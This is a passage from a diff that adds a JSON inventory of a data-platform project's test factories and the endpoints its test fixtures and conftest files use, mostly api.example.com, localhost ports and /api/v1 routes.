+      "line_number": 431,
+      "methods": [],
+      "method_count": 0
+    },
+    {
+      "file_path": "tests/factories_boy.py",
+      "class_name": "ScheduledIngestionFactoryEnhanced",
+      "line_number": 445,
+      "methods": [],
+      "method_count": 0
+    },
+    {
+      "file_path": "tests/factories.py",
+      "class_name": "UserFactory",
+      "line_number": 23,
+      "methods": [
+        "create_user",
+        "__call__"
+      ],
+      "method_count": 2
+    },
+    {
+      "file_path": "tests/factories.py",
+      "class_name": "TenantFactory",
+      "line_number": 55,
+      "methods": [
+        "create_tenant",
+        "__call__"
+      ],
+      "method_count": 2
+    },
+    {
+      "file_path": "tests/factories.py",
+      "class_name": "TenantConfigFactory",
+      "line_number": 99,
+      "methods": [
+        "create_tenant_config",
+        "create_tenant_config_with_all_fields"
+      ],
+      "method_count": 2
+    },
+    {
+      "file_path": "tests/factories.py",
+      "class_name": "EmailDeliveryFactory",
+      "line_number": 187,
+      "methods": [
+        "create_email_delivery",
+        "create_email_delivery_with_all_statuses",
+        "create_email_delivery_with_all_types"
+      ],
+      "method_count": 3
+    },
+    {
+      "file_path": "tests/factories.py",
+      "class_name": "JobFactory",
+      "line_number": 287,
+      "methods": [
+        "create_job",
+        "create_job_with_all_types",
+        "create_job_with_all_statuses"
+      ],
+      "method_count": 3
+    },
+    {
+      "file_path": "tests/factories.py",
+      "class_name": "AssetFactory",
+      "line_number": 603,
+      "methods": [
+        "create",
+        "__new__"
+      ],
+      "method_count": 2
+    },
+    {
+      "file_path": "tests/factories.py",
+      "class_name": "WorkflowDefinitionFactory",
+      "line_number": 445,
+      "methods": [
+        "create_workflow_definition"
+      ],
+      "method_count": 1
+    },
+    {
+      "file_path": "tests/factories.py",
+      "class_name": "WorkflowInstanceFactory",
+      "line_number": 475,
+      "methods": [
+        "create_workflow_instance"
+      ],
+      "method_count": 1
+    },
+    {
+      "file_path": "tests/factories.py",
+      "class_name": "WorkflowStepFactory",
+      "line_number": 506,
+      "methods": [
+        "create_workflow_step"
+      ],
+      "method_count": 1
+    },
+    {
+      "file_path": "tests/factories.py",
+      "class_name": "ValidationResultFactory",
+      "line_number": 533,
+      "methods": [
+        "create_valid_result",
+        "create_invalid_result"
+      ],
+      "method_count": 2
+    },
+    {
+      "file_path": "tests/factories.py",
+      "class_name": "RuleExecutionContextFactory",
+      "line_number": 560,
+      "methods": [
+        "create_context"
+      ],
+      "method_count": 1
+    },
+    {
+      "file_path": "tests/factories.py",
+      "class_name": "OrchestrationRuleExecutionContextFactory",
+      "line_number": 577,
+      "methods": [
+        "create_context"
+      ],
+      "method_count": 1
+    },
+    {
+      "file_path": "hub/apps/datasets/tests/factories.py",
+      "class_name": "DatasetFactory",
+      "line_number": 19,
+      "methods": [
+        "create_dataset",
+        "create_dataset_with_complex_schema"
+      ],
+      "method_count": 2
+    },
+    {
+      "file_path": "hub/apps/scheduled_ingestion/tests/factories.py",
+      "class_name": "ScheduledIngestionFactory",
+      "line_number": 21,
+      "methods": [
+        "create_scheduled_ingestion"
+      ],
+      "method_count": 1
+    },
+    {
+      "file_path": "hub/apps/scheduled_ingestion/tests/factories.py",
+      "class_name": "ScheduledIngestionRunFactory",
+      "line_number": 85,
+      "methods": [
+        "create_scheduled_ingestion_run"
+      ],
+      "method_count": 1
+    },
+    {
+      "file_path": "hub/apps/contracts/tests/factories.py",
+      "class_name": "ContractFactoryEnhanced",
+      "line_number": 26,
+      "methods": [
+        "create_hub_contract_json",
+        "create_contract",
+        "create_contract_with_all_sections"
+      ],
+      "method_count": 3
+    },
+    {
+      "file_path": "hub/apps/files/tests/factories.py",
+      "class_name": "FileFactory",
+      "line_number": 19,
+      "methods": [
+        "create_file",
+        "create_file_with_all_statuses",
+        "create_large_file"
+      ],
+      "method_count": 3
+    },
+    {
+      "file_path": "hub/apps/assets/tests/factories.py",
+      "class_name": "AssetFactory",
+      "line_number": 17,
+      "methods": [
+        "create_asset",
+        "create_active_asset",
+        "create_asset_with_all_statuses",
+        "__call__"
+      ],
+      "method_count": 4
+    },
+    {
+      "file_path": "hub/apps/tenants/tests/factories.py",
+      "class_name": "TenantFactory",
+      "line_number": 41,
+      "methods": [
+        "create_tenant"
+      ],
+      "method_count": 1
+    },
+    {
+      "file_path": "hub/apps/tenants/tests/factories.py",
+      "class_name": "TenantConfigFactory",
+      "line_number": 65,
+      "methods": [
+        "create_config"
+      ],
+      "method_count": 1
+    },
+    {
+      "file_path": "hub/apps/tenants/tests/factories.py",
+      "class_name": "SubscriptionFactory",
+      "line_number": 86,
+      "methods": [
+        "create_subscription"
+      ],
+      "method_count": 1
+    },
+    {
+      "file_path": "hub/apps/versioning/tests/factories.py",
+      "class_name": "DatasetVersionFactory",
+      "line_number": 19,
+      "methods": [
+        "create_dataset_version"
+      ],
+      "method_count": 1
+    },
+    {
+      "file_path": "hub/apps/versioning/tests/factories.py",
+      "class_name": "SchemaVersionFactory",
+      "line_number": 72,
+      "methods": [
+        "create_schema_version"
+      ],
+      "method_count": 1
+    }
+  ],
+  "endpoint_urls": [
+    {
+      "file": "tests/fixtures/marketplace/ckan/datasets/dataset_with_odps_metadata.json",
+      "type": "json",
+      "endpoint": "api.example.com",
+      "context": "fixture"
+    },
+    {
+      "file": "tests/fixtures/marketplace/ckan/resources/sample_api_resource.json",
+      "type": "json",
+      "endpoint": "api.example.com",
+      "context": "fixture"
+    },
+    {
+      "file": "tests/fixtures/odps/v4.1/marketplace/sample-complete-marketplace-v4.1.json",
+      "type": "json",
+      "endpoint": "api.example.com",
+      "context": "fixture"
+    },
+    {
+      "file": "tests/fixtures/odps/v4.1/marketplace/sample-access-methods-v4.1.json",
+      "type": "json",
+      "endpoint": "api.example.com",
+      "context": "fixture"
+    },
+    {
+      "file": "tests/fixtures/odps/v4.1/multilingual/sample-multiple-languages-v4.1.json",
+      "type": "json",
+      "endpoint": "api.example.com",
+      "context": "fixture"
+    },
+    {
+      "file": "tests/fixtures/odps/v4.1/valid/sample-valid-v4.1.json",
+      "type": "json",
+      "endpoint": "api.example.com",
+      "context": "fixture"
+    },
+    {
+      "file": "tests/fixtures/odps/v4.0/valid/sample-valid-v4.0.json",
+      "type": "json",
+      "endpoint": "api.example.com",
+      "context": "fixture"
+    },
+    {
+      "file": "tests/fixtures/odps/security/malicious/script-injection-attempt.json",
+      "type": "json",
+      "endpoint": "api.example.com",
+      "context": "fixture"
+    },
+    {
+      "file": "tests/fixtures/odps/security/malicious/command-injection-attempt.json",
+      "type": "json",
+      "endpoint": "api.example.com",
+      "context": "fixture"
+    },
+    {
+      "file": "tests/conftest.py",
+      "type": "conftest",
+      "endpoint": "http://localhost:8081",
+      "context": "fixture"
+    },
+    {
+      "file": "tests/conftest.py",
+      "type": "conftest",
+      "endpoint": "http://localhost:8083",
+      "context": "fixture"
+    },
+    {
+      "file": "tests/conftest.py",
+      "type": "conftest",
+      "endpoint": "http://localhost:8080",
+      "context": "fixture"
+    },
+    {
+      "file": "tests/conftest.py",
+      "type": "conftest",
+      "endpoint": "localhost:8083",
+      "context": "fixture"
+    },
+    {
+      "file": "tests/conftest.py",
+      "type": "conftest",
+      "endpoint": "http://localhost:8082",
+      "context": "fixture"
+    },
+    {
+      "file": "tests/conftest.py",
+      "type": "conftest",
+      "endpoint": "localhost:8080",
+      "context": "fixture"
+    },
+    {
+      "file": "tests/conftest.py",
+      "type": "conftest",
+      "endpoint": "localhost:8081",
+      "context": "fixture"
+    },
+    {
+      "file": "tests/conftest.py",
+      "type": "conftest",
+      "endpoint": "localhost:8082",
+      "context": "fixture"
+    },
+    {
+      "file": "services/semantic-service/tests/conftest.py",
+      "type": "conftest",
+      "endpoint": "localhost:8086",
+      "context": "fixture"
+    },
+    {
+      "file": "services/semantic-service/tests/conftest.py",
+      "type": "conftest",
+      "endpoint": "localhost:8081",
+      "context": "fixture"
+    },
+    {
+      "file": "services/semantic-service/tests/conftest.py",
+      "type": "conftest",
+      "endpoint": "http://localhost:8086",
+      "context": "fixture"
+    },
+    {
+      "file": "services/semantic-service/tests/conftest.py",
+      "type": "conftest",
+      "endpoint": "localhost:3031",
+      "context": "fixture"
+    },
+    {
+      "file": "services/odh-integration/tests/conftest.py",
+      "type": "conftest",
+      "endpoint": "http://localhost:8081",
+      "context": "fixture"
+    },
+    {
+      "file": "services/odh-integration/tests/conftest.py",
+      "type": "conftest",
+      "endpoint": "http://localhost:8083",
+      "context": "fixture"
+    },
+    {
+      "file": "services/odh-integration/tests/conftest.py",
+      "type": "conftest",
+      "endpoint": "http://localhost:8080",
+      "context": "fixture"
+    },
+    {
+      "file": "services/odh-integration/tests/conftest.py",
+      "type": "conftest",
+      "endpoint": "localhost:8083",
+      "context": "fixture"
+    },
+    {
+      "file": "services/odh-integration/tests/conftest.py",
+      "type": "conftest",
+      "endpoint": "http://localhost:8082",
+      "context": "fixture"
+    },
+    {
+      "file": "services/odh-integration/tests/conftest.py",
+      "type": "conftest",
+      "endpoint": "localhost:8080",
+      "context": "fixture"
+    },
+    {
+      "file": "services/odh-integration/tests/conftest.py",
+      "type": "conftest",
+      "endpoint": "localhost:8081",
+      "context": "fixture"
+    },
+    {
+      "file": "services/odh-integration/tests/conftest.py",
+      "type": "conftest",
+      "endpoint": "localhost:8082",
+      "context": "fixture"
+    },
+    {
+      "file": "tests/prefect/conftest.py",
+      "type": "conftest",
+      "endpoint": "localhost:4200",
+      "context": "fixture"
+    },
+    {
+      "file": "tests/e2e/conftest.py",
+      "type": "conftest",
+      "endpoint": "/api/v1/assets/{asset_id}/activate/",
+      "context": "fixture"
+    },
+    {
+      "file": "tests/e2e/conftest.py",
+      "type": "conftest",
+      "endpoint": "/api/v1/files/init/",
+      "context": "fixture"
+    },
+    {
+      "file": "tests/e2e/conftest.py",
+      "type": "conftest",
+      "endpoint": "/api/v1/auth/login/,",
+      "context": "fixture"
+    },
+    {
+      "file": "tests/e2e/conftest.py",
+      "type": "conftest",
+      "endpoint": "/api/v1/contracts/{contract_id}/validate/",
+      "context": "fixture"
+    },
+    {
+      "file": "tests/e2e/conftest.py",
+      "type": "conftest",
+      "endpoint": "/api/v1/contracts/",
+      "context": "fixture"
+    },
+    {
+      "file": "tests/e2e/conftest.py",
+      "type": "conftest",
+      "endpoint": "/api/v1/compliance/runs/",
+      "context": "fixture"
+    },
+    {
+      "file": "tests/e2e/conftest.py",
+      "type": "conftest",
+      "endpoint": "/api/v1/dq/runs/",
+      "context": "fixture"
+    },
+    {
+      "file": "tests/e2e/conftest.py",
+      "type": "conftest",
+      "endpoint": "/api/v1/datasets/",
+      "context": "fixture"
+    },
+    {
+      "file": "tests/e2e/conftest.py",
+      "type": "conftest",
+      "endpoint": "localhost:8000",
+      "context": "fixture"
+    },
+    {
+      "file": "tests/e2e/conftest.py",
+      "type": "conftest",
+      "endpoint": "/api/v1/assets/{asset_id}/contracts/",
+      "context": "fixture"
+    },
+    {
+      "file": "tests/e2e/conftest.py",
+      "type": "conftest",
+      "endpoint": "/api/v1/files/{file_id}/complete/",
+      "context": "fixture"
+    },
+    {
+      "file": "tests/sdk_python/conftest.py",
+      "type": "conftest",
+      "endpoint": "/api/v1/auth/login/",
+      "context": "fixture"
+    },
+    {
+      "file": "tests/sdk_python/conftest.py",
+      "type": "conftest",
+      "endpoint": "localhost:8000",
+      "context": "fixture"
+    },
+    {
+      "file": "tests/smoke/conftest.py",
+      "type": "conftest",
+      "endpoint": "/api/v1/auth/login/",
+      "context": "fixture"
+    },
+    {
+      "file": "tests/smoke/conftest.py",
+      "type": "conftest",
+      "endpoint": "localhost:8001",
+      "context": "fixture"
+    },
+    {
+      "file": "sdk/python/tests/conftest.py",
+      "type": "conftest",
+      "endpoint": "/api/v1/auth/me/",
+      "context": "fixture"
+    },
+    {
+      "file": "sdk/python/tests/conftest.py",
+      "type": "conftest",
+      "endpoint": "/api/v1/health/",
+      "context": "fixture"
+    },
+    {
+      "file": "sdk/python/tests/conftest.py",
+      "type": "conftest",
+      "endpoint": "/api/v1/tenants/{tenant_id}/",
+      "context": "fixture"
+    },
+    {
+      "file": "sdk/python/tests/conftest.py",
+      "type": "conftest",
+      "endpoint": "/api/v1/auth/refresh/",
+      "context": "fixture"
+    },
+    {
+      "file": "sdk/python/tests/conftest.py",
+      "type": "conftest",
+      "endpoint": "/api/v1/tenants/{id}/)",
+      "context": "fixture"
+    },
+    {
+      "file": "sdk/python/tests/conftest.py",
+      "type": "conftest",
+      "endpoint": "/api/v1/auth/login/",
+      "context": "fixture"
+    },
+    {
+      "file": "sdk/python/tests/use_cases/conftest.py",
+      "type": "conftest",
+      "endpoint": "/api/v1/auth/me/",
+      "context": "fixture"
+    },
+    {
+      "file": "sdk/python/build/lib/tests/conftest.py",
+      "type": "conftest",
+      "endpoint": "/api/v1/auth/me/",
+      "context": "fixture"
+    },
+    {
+      "file": "sdk/python/build/lib/tests/conftest.py",
+      "type": "conftest",
+      "endpoint": "/api/v1/health/",
+      "context": "fixture"
+    },
+    {
+      "file": "sdk/python/build/lib/tests/conftest.py",
+      "type": "conftest",
+      "endpoint": "/api/v1/tenants/{tenant_id}/",
+      "context": "fixture"
+    },
+    {
+      "file": "sdk/python/build/lib/tests/conftest.py",
+      "type": "conftest",
+      "endpoint": "/api/v1/auth/refresh/",
+      "context": "fixture"
+    },
+    {
+      "file": "sdk/python/build/lib/tests/conftest.py",
+      "type": "conftest",
+      "endpoint": "/api/v1/tenants/{id}/)",
+      "context": "fixture"
+    },
+    {
+      "file": "sdk/python/build/lib/tests/conftest.py",
+      "type": "conftest",
+      "endpoint": "/api/v1/auth/login/",
+      "context": "fixture"
+    },
+    {
+      "file": "sdk/python/build/lib/tests/use_cases/conftest.py",
+      "type": "conftest",
+      "endpoint": "/api/v1/auth/me/",
+      "context": "fixture"
+    }
+  ],
+  "fixture_endpoints": {
+    "tests/fixtures/marketplace/ckan/datasets/dataset_with_odps_metadata.json": [
+      "api.example.com"
+    ],
+    "tests/fixtures/marketplace/ckan/resources/sample_api_resource.json": [
+      "api.example.com"
+    ],
+    "tests/fixtures/odps/v4.1/marketplace/sample-complete-marketplace-v4.1.json": [
+      "api.example.com"
+    ],
+    "tests/fixtures/odps/v4.1/marketplace/sample-access-methods-v4.1.json": [
+      "api.example.com"
+    ],
+    "tests/fixtures/odps/v4.1/multilingual/sample-multiple-languages-v4.1.json": [
+      "api.example.com"
+    ],
+    "tests/fixtures/odps/v4.1/valid/sample-valid-v4.1.json": [
+      "api.example.com"
+    ],
+    "tests/fixtures/odps/v4.0/valid/sample-valid-v4.0.json": [
+      "api.example.com"
+    ],
+    "tests/fixtures/odps/security/malicious/script-injection-attempt.json": [
+      "api.example.com"
+    ],
+    "tests/fixtures/odps/security/malicious/command-injection-attempt.json": [
+      "api.example.com"
+    ],
+    "tests/conftest.py": [
+      "http://localhost:8081",
+      "http://localhost:8083",
+      "http://localhost:8080",
+      "localhost:8083",
+      "http://localhost:8082",
+      "localhost:8080",
+      "localhost:8081",
+      "localhost:8082"
+    ],
+    "services/semantic-service/tests/conftest.py": [
+      "localhost:8086",
+      "localhost:8081",
+      "http://localhost:8086",
+      "localhost:3031"
+    ],
+    "services/odh-integration/tests/conftest.py": [
+      "http://localhost:8081",
+      "http://localhost:8083",
+      "http://localhost:8080",
+      "localhost:8083",
+      "http://localhost:8082",
+      "localhost:8080",
+      "localhost:8081",
+      "localhost:8082"
+    ],
+    "tests/prefect/conftest.py": [
+      "localhost:4200"
+    ],
+    "tests/e2e/conftest.py": [
+      "/api/v1/assets/{asset_id}/activate/",
+      "/api/v1/files/init/",
+      "/api/v1/auth/login/,",
+      "/api/v1/contracts/{contract_id}/validate/",
+      "/api/v1/contracts/",
+      "/api/v1/compliance/runs/",
+      "/api/v1/dq/runs/",
+      "/api/v1/datasets/",
+      "localhost:8000",
+      "/api/v1/assets/{asset_id}/contracts/",
+      "/api/v1/files/{file_id}/complete/"
+    ],
+    "tests/sdk_python/conftest.py": [
+      "/api/v1/auth/login/",
+      "localhost:8000"
+    ],
+    "tests/smoke/conftest.py": [
+      "/api/v1/auth/login/",
+      "localhost:8001"
+    ],
+    "sdk/python/tests/conftest.py": [
+      "/api/v1/auth/me/",
+      "/api/v1/health/",
+      "/api/v1/tenants/{tenant_id}/",
+      "/api/v1/auth/refresh/",
+      "/api/v1/tenants/{id}/)",
+      "/api/v1/auth/login/"
+    ],
+    "sdk/python/tests/use_cases/conftest.py": [
+      "/api/v1/auth/me/"
+    ],
+    "sdk/python/build/lib/tests/conftest.py": [
+      "/api/v1/auth/me/",
+      "/api/v1/health/",
+      "/api/v1/tenants/{tenant_id}/",
+      "/api/v1/auth/refresh/",
+      "/api/v1/tenants/{id}/)",
+      "/api/v1/auth/login/"
+    ],
+    "sdk/python/build/lib/tests/use_cases/conftest.py": [
+      "/api/v1/auth/me/"
+    ]
+  }
+}
